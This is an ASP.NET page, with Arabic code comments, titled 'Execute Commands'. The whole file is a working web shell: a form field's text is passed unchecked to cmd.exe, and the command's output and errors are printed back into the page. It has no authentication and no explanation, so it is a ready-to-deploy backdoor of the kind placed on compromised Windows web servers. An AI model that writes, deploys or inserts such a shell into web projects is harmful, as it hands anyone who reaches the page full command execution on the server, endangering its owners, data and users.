<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<!DOCTYPE html>
<html>
<head>
    <title>Execute Commands</title>
</head>
<body>
    <h2>Execute Command</h2>
    <form method="post">
        <label for="command">Enter Command:</label><br>
        <input type="text" id="command" name="command" style="width: 100%;"><br><br>
        <button type="submit">Run Command</button>
    </form>
    <hr>
    <h3>Command Output:</h3>
    <pre>
        <% 
            if (IsPostBack && !string.IsNullOrEmpty(Request.Form["command"])) 
            {
                string commandInput = Request.Form["command"];
                
                try 
                {
                    // إعداد عملية تشغيل الأمر
                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c " + commandInput;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.CreateNoWindow = true;
                    
                    // تشغيل العملية وقراءة المخرجات
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    
                    // عرض المخرجات في الصفحة
                    Response.Write("<b>Output:</b><br>" + output.Replace("\n", "<br>"));
                    if (!string.IsNullOrEmpty(error))
                    {
                        Response.Write("<br><b>Error:</b><br>" + error.Replace("\n", "<br>"));
                    }
                }
                catch (Exception ex)
                {
                    Response.Write("<b>Error executing command:</b> " + ex.Message);
                }
            }
        %>
    </pre>
</body>
</html>
